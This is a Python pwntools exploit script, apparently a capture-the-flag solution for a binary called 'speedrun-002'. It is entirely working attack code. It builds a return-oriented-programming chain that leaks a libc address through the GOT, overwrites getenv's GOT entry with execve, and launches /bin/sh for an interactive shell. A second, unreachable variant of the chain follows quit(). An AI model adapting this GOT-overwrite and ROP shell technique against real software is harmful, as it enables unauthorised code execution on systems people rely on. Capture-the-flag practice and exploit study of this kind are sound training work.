#!/usr/bin/env python

from pwn import *

env = {
        'DEBUG': "Put anything here !!",
}


buf = any_writable = 0x601800

plt_getenv = 0x400590
plt_write= 0x4005c0
plt_read = 0x4005e0

const_str_debug = 0x400991

p_rsi_p_r15_ret = 0x4008a1
p_rdi_ret = 0x4008a3
p_rdx_ret = 0x4006ec

write_got = 0x601030
got_getenv = 0x601018

read_again_pos = 0x40071d


s = "Everything intelligent is so boring.".ljust(0x12c,"\x00")
##

argv = ["./speedrun-002"]

p = process(argv, env=env)
## get to specific branch
p.recvuntil("What say you now?")
p.send(s)

## rop 1 : leak got
p.recvuntil("Tell me more.")
payload  = cyclic(cyclic_find("iaakjaak"[:4]))
## write(1, got_getenv, 8)
payload += p64(p_rdi_ret) + p64(1)
payload += p64(p_rsi_p_r15_ret) + p64(got_getenv) + p64(0xdeadbeef)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(plt_write)
## read(0, got_getenv, 8)
payload += p64(p_rdi_ret) + p64(0)
payload += p64(p_rsi_p_r15_ret) + p64(got_getenv) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(plt_read)
## read(0, buf, 8)
payload += p64(p_rdi_ret) + p64(0)
payload += p64(p_rsi_p_r15_ret) + p64(buf) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(plt_read)
## execve(buf, 0 ,0 )
payload += p64(p_rdi_ret) + p64(buf)
payload += p64(p_rsi_p_r15_ret) + p64(0) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0)
payload += p64(plt_getenv)
payload  = payload.ljust(0x7da)
p.send(payload)

p.recvuntil("Fascinating.")
p.recvn(1)
leak = p.recvn(8)
getenv_libc = u64(leak)
print "getenv : %.16x" % getenv_libc
execve_libc = u64(leak) + 0x7ffff7ac8e30 - 0x7ffff7a266e0

p.send(p64(execve_libc))
p.send("/bin/sh"+"\x00")
p.interactive()

with open("payload", "wb") as outf:
    outf.write(s)
    outf.write(payload)
    outf.close()

quit()
## rop 2 : overwrite got_getenv


payload  = cyclic(cyclic_find("iaakjaak"[:4]))
payload += p64(p_rdi_ret) + p64(0)
payload += p64(p_rsi_p_r15_ret) + p64(buf) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(plt_read)
payload += p64(p_rdi_ret) + p64(0)
payload += p64(p_rsi_p_r15_ret) + p64(got_getenv) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0x8)
payload += p64(plt_read)
payload += p64(p_rdi_ret) + p64(buf)
payload += p64(p_rsi_p_r15_ret) + p64(0) + p64(0x1cec0ffee)
payload += p64(p_rdx_ret) + p64(0)
payload += p64(plt_getenv)
payload = payload.ljust(0x7da)
p.send(payload)

p.recvuntil("Fascinating.")
p.send("/bin/sh" + "\x00")
p.send(p64(execve_libc))
p.interactive()



